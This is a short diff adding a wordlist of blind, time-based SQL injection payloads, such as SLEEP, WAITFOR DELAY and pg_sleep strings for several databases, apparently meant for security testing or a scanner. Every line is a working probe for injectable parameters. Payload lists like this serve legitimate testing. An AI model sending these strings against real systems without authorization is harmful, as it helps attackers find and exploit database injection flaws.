@@ -1,0 +1,8 @@
+# Blind / time-based SQL injection payloads
+' AND SLEEP(5)-- -
+' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -
+'; WAITFOR DELAY '0:0:5'-- -
+' AND pg_sleep(5)-- -
+1 AND SLEEP(5)
+' OR IF(1=1,SLEEP(5),0)-- -
+" AND SLEEP(5)-- -
